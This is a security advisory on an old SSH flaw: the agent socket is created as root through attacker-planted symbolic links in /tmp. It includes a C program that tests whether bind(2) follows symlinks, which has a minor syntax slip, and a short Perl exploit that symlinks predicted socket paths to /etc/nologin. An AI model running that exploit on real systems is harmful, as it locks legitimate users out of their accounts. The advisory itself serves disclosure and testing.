source: http://www.securityfocus.com/bid/660/info

A vulnerability in SSH's creation of the authentication agent UNIX domain socket allows local users to create a UNIX domain socket with an arbitrary file name in the system.

SSH has the concept of authentication proxying via the SSH authentication agent. It allows for a basic kind of Single Sign-On capability. The sshd daemon, ssh and ssh-agent communicate via a UNIX domain socket normally of the form '/tmp/ssh-<username>/agent-socket-<pid>'.

SSH follows symbolic links while creating the socket as root thus allowing any local users with ssh access to create a socket with an arbitrary filename in the system.

Notice that this will not work under all operating systems. Some operating systems do not follow symbolic links during bind(2) on UNIX domain sockets. Linux 2.0.x, Solaris 2.5.1 and IRIX 6.5.2 do not follow symbolic links during bind(2). Linux 2.1.x does.

You can use the following program by Dan Astoorian <djast@cs.toronto.edu> to test whether your system does or does not follow symbolic links during bind(2):

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#define FPATH "./bindlinktest"
#define LPATH "./bindlinktest0"

int main(int argc, char **argv) {
int fd;
struct sockaddr_un sunaddr;

fd = socket(AF_UNIX, SOCK_STREAM, 0);
if (fd < 0) { perror("socket");exit(1); };

unlink(FPATH);
if (symlink(FPATH, LPATH) < 0) {
perror("symlink");exit(1);
}

memset(&sunaddr, 0, sizeof(sunaddr));
sunaddr.sun_family = AF_UNIX;
strncpy(sunaddr.sun_path, LPATH, sizeof(sunaddr.sun_path));
if (bind(fd, (struct sockaddr *)&sunaddr, sizeof(sunaddr)) < 0) {
if (errno == EADDRINUSE) {
printf("bind() returned EADDRINUSE; this system appears to be okay.\n");
} else {
perror("bind");
}
} else {
printf("bind() succeeded; this system appears to be vulnerable.\n");
}

close(fd)
unlink(FPATH);
unlink(LPATH);
exit(0);
} 

#!/usr/bin/perl

$pid = $$;

$whoami = `whoami`;
chop($whoami);
mkdir("/tmp/ssh-$whoami", 0700);

for ($i = $pid; $i < $pid+50; $i++)
{
symlink("/etc/nologin", "/tmp/ssh-$whoami/ssh-$i-agent");
}

